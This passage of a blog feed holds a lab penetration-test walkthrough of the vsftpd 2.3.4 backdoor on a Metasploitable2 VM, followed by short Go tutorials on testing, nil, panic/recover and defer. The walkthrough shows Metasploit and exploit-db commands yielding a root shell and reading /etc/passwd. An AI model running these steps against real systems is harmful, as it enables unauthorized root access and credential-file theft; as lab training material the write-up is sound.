class="line">       Name: VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line">     Module: exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2011-07-03</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  hdm &lt;x@hdm.io&gt;</span><br><span class="line">  MC &lt;mc@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name    Current Setting  Required  Description</span><br><span class="line">  ----    ---------------  --------  -----------</span><br><span class="line">  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">  RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 2000</span><br><span class="line">  Avoid: 0 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a malicious backdoor that was added to the       VSFTPD download</span><br><span class="line">  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between</span><br><span class="line">  June 30th 2011 and July 1st 2011 according to the most recent information</span><br><span class="line">  available. This backdoor was removed on July 3rd 2011.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  OSVDB (73573)</span><br><span class="line">  http://pastebin.com/AetT9sS5</span><br><span class="line">  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.244.136</span><br><span class="line">rhosts =&gt; 192.168.244.136</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.244.136:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 192.168.244.136:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 192.168.244.136:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 192.168.244.136:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">id</span><br><span class="line">[*] Command shell session 1 opened (192.168.244.140:41279 -&gt; 192.168.244.136:6200) at 2024-01-05 16:46:43 -0500</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>VSFTPD 2.3.4 exploit with python POC:</li></ol><p>First, we should search the valid POC from kali’s exploit db with follow command line:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -t vsftpd      </span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                   |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line">vsftpd 2.0.5 - &#x27;CWD&#x27; (Authenticated) Remote Memory Consumption                   | linux/dos/5814.pl</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (1)                   | windows/dos/31818.sh</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (2)                   | windows/dos/31819.pl</span><br><span class="line">vsftpd 2.3.2 - Denial of                                                         | linux/dos/16270.c</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb</span><br><span class="line">vsftpd 3.0.3 - Remote Denial of Service                                          | multiple/remote/49719.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Next, we copy the valid POC to current work directory, and try to exploit , the follow shows the exploit process: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -m  unix/remote/49757.py </span><br><span class="line"></span><br><span class="line">  Exploit: vsftpd 2.3.4 - Backdoor Command Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/49757</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py</span><br><span class="line">    Codes: CVE-2011-2523</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line">cp: overwrite &#x27;/home/kali/Desktop/cd/49757.py&#x27;? yes</span><br><span class="line">Copied to: /home/kali/Desktop/cd/49757.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# chmod +x 49757.py</span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# ls</span><br><span class="line"> 49757.py  wordlists                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# python ./49757.py  192.168.244.136 </span><br><span class="line">Success, shell opened</span><br><span class="line">Send `exit` to quit shell</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">cdrom</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd</span><br><span class="line">initrd.img</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">nohup.out</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br><span class="line">bind:x:105:113::/var/cache/bind:/bin/false</span><br><span class="line">postfix:x:106:115::/var/spool/postfix:/bin/false</span><br><span class="line">ftp:x:107:65534::/home/ftp:/bin/false</span><br><span class="line">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false</span><br><span class="line">distccd:x:111:65534::/:/bin/false</span><br><span class="line">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span><br><span class="line">service:x:1002:1002:,,,:/home/service:/bin/bash</span><br><span class="line">telnetd:x:112:120::/nonexistent:/bin/false</span><br><span class="line">proftpd:x:113:65534::/var/run/proftpd:/bin/false</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/bin/false</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC&quot;&gt;&lt;a href=&quot;#metasploitable-linux-VSFTPD-2-3-4-exploit-with</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="metasploitable2" scheme="http://example.com/categories/Penetration-Test/metasploitable2/"/>
    
    <category term="linux" scheme="http://example.com/categories/Penetration-Test/metasploitable2/linux/"/>
    
    <category term="VSFTPD 2.3.4 exploit" scheme="http://example.com/categories/Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>About File Testing in the Go Language.</title>
    <link href="http://example.com/2019/02/12/goAboutUnitTest/"/>
    <id>http://example.com/2019/02/12/goAboutUnitTest/</id>
    <published>2019-02-13T01:59:33.000Z</published>
    <updated>2023-10-17T16:31:11.713Z</updated>
    
    <content type="html"><![CDATA[<p>To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code within it. Here’s an example: you have a file named math.go containing a simple mathematical function ‘Add.’ Then, you will create a test file named math_test.go to test this function.</p><p>Assuming the math.go file is as follows:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can then create a math_test.go file to write your test code:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math_test.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAdd</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    result := Add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    expected := <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> result != expected &#123;</span><br><span class="line">        t.Errorf(<span class="string">&quot;Add(2, 3) returned %d, expected %d&quot;</span>, result, expected)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In math_test.go, we import the testing package and write a test function named TestAdd. Test functions should start with ‘Test’ and accept a <strong><em>*testing.T</em></strong> parameter, which is used to report test failures.</p><p>Inside the TestAdd function, we call Add(2, 3) to execute the function being tested and compare the result to the expected value. If the result doesn’t match the expected value, we use <strong><em>t.Errorf</em></strong> to report the test failure with detailed error information.</p><p>Next, you can run the tests using the ‘<strong><em>go test</em></strong>‘ command in your terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Go will search for all the <strong><em>_test.go</em></strong> files <strong><em>in the current directory and execute the test functions within them</em></strong>. If the tests pass, you’ll see a success message. If the tests fail, you’ll get detailed failure information.</p><p>This is just a very basic example. In real-world projects, you can write more test cases to cover various scenarios and ensure that your code works correctly in different situations.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code wit</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="Unit Test" scheme="http://example.com/categories/Go/Unit-Test/"/>
    
    
  </entry>
  
  <entry>
    <title>nil in the Go language</title>
    <link href="http://example.com/2019/01/03/goNil/"/>
    <id>http://example.com/2019/01/03/goNil/</id>
    <published>2019-01-04T03:59:12.000Z</published>
    <updated>2023-10-17T15:38:41.786Z</updated>
    
    <content type="html"><![CDATA[<p>In the Go language, “<strong><em>nil</em></strong>“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “<strong><em>nil</em></strong>“:</p><ol><li><strong><em>Pointer and Reference Types</em></strong>: The most common use of “<strong><em>nil</em></strong>“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “<strong><em>nil</em></strong>“ is used in the following cases:</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ptr *<span class="type">int</span>    <span class="comment">// Declare an integer pointer, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> slice []<span class="type">int</span> <span class="comment">// Declare an integer slice, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> <span class="comment">// Declare a map, its zero value is nil</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong><em>Interface Types</em></strong>: “<strong><em>nil</em></strong>“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned).</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInterface <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> myInterface == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The interface is empty&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong><em>Function and Method Return Values</em></strong>: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “<strong><em>nil</em></strong>,” indicating that there are no valid return values.</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findValue</span><span class="params">(slice []<span class="type">int</span>, target <span class="type">int</span>)</span></span> (*<span class="type">int</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, val := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> val == target &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;slice[i], <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s important to handle “<strong><em>nil</em></strong>“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “<strong><em>nil</em></strong>“ before accessing them to ensure safety.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In the Go language, “&lt;strong&gt;&lt;em&gt;nil&lt;/em&gt;&lt;/strong&gt;“ is a special predefined value commonly used to represent zero values or missing value</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="nil" scheme="http://example.com/categories/Go/nil/"/>
    
    
  </entry>
  
  <entry>
    <title>panic() and recover() in the Go Language</title>
    <link href="http://example.com/2018/12/30/goPanicAndRecover/"/>
    <id>http://example.com/2018/12/30/goPanicAndRecover/</id>
    <published>2018-12-31T01:48:46.000Z</published>
    <updated>2023-10-17T15:39:09.027Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> are two important functions in the Go language for handling exceptions. Here is a simple example that demonstrates how to use <strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> in Go.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// A function to simulate a situation that might cause a panic</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Panic occurred but recovered:&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Simulate a problematic situation</span></span><br><span class="line">    num1 := <span class="number">10</span></span><br><span class="line">    num2 := <span class="number">0</span></span><br><span class="line">    result := num1 / num2 <span class="comment">// This will cause a division by zero panic</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result is:&quot;</span>, result) <span class="comment">// This won&#x27;t be printed as the panic has already occurred</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Starting the program&quot;</span>)</span><br><span class="line"></span><br><span class="line">    doSomething()</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Program continues to execute&quot;</span>) <span class="comment">// Even if a panic occurs, this line will be printed because the panic has been recovered in doSomething()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In the example above, the doSomething() function attempts to divide 10 by 0, which would lead to a division by zero panic. However, we use <strong><em>defer()</em></strong> and <strong><em>recover()</em></strong> to catch and handle the panic. In the main() function, even if a panic occurs within doSomething(), the program continues to execute, and the panic information is printed within the <strong><em>recover()</em></strong> block.</p><p>Running this program will produce the following output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Starting the program</span><br><span class="line">Panic occurred but recovered: runtime error: <span class="built_in">integer</span> divide by zero</span><br><span class="line">Program continues to execute</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>This demonstrates that the <strong><em>recover()</em></strong> function successfully catches the panic, allowing the program to continue executing without terminating.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;panic()&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;recover()&lt;/em&gt;&lt;/strong&gt; are two important functions in the Go language for handling exc</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="panic() and recover()" scheme="http://example.com/categories/Go/panic-and-recover/"/>
    
    
  </entry>
  
  <entry>
    <title>defer in the Go Language</title>
    <link href="http://example.com/2018/12/16/goDefer/"/>
    <id>http://example.com/2018/12/16/goDefer/</id>
    <published>2018-12-17T04:33:42.000Z</published>
    <updated>2023-10-17T15:38:15.816Z</updated>
    
    <content type="html"><![CDATA[<p>In Go language, <strong><em>defer</em></strong> is a very useful keyword used for deferring the execution of functions, typically employed for performing cleanup or resource release operations before a function returns.</p><p>A <strong><em>defer</em></strong> statement pushes the function call that should be deferred onto a stack and executes these deferred function calls in a <strong><em>last-in, first-out (LIFO)</em></strong> order just before the current function returns.</p><p>Here are some important features and uses of <strong><em>defer</em></strong>:</p><ol><li><p><strong><em>Deferred Execution</em></strong>: Using the <strong><em>defer</em></strong> keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error.</p></li><li><p><strong><em>Resource Cleanup</em></strong>: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks.</p></li><li><p><strong><em>Parameter Evaluation</em></strong>: The parameters in a <strong><em>defer</em></strong> statement are evaluated when the <strong><em>defer</em></strong> statement is executed, not when the function returns.</p></li></ol><p>Here are some examples demonstrating the use of <strong><em>defer</em></strong>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Example 1: defer for file closing</span></span><br><span class="line">    file := openFile(<span class="string">&quot;example.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">defer</span> closeFile(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 2: defer for logging function execution time</span></span><br><span class="line">    <span class="keyword">defer</span> logTime(<span class="string">&quot;Function execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 3: Multiple defer statements execute in a last-in, first-out order</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Deferred statement&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Function body&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openFile</span><span class="params">(filename <span class="type">string</span>)</span></span> *File &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Opening file:&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">// Open the file and return the file handle</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closeFile</span><span class="params">(file *File)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Closing file&quot;</span>)</span><br><span class="line">    <span class="comment">// Close the file</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logTime</span><span class="params">(message <span class="type">string</span>)</span></span> &#123;</span><br><span 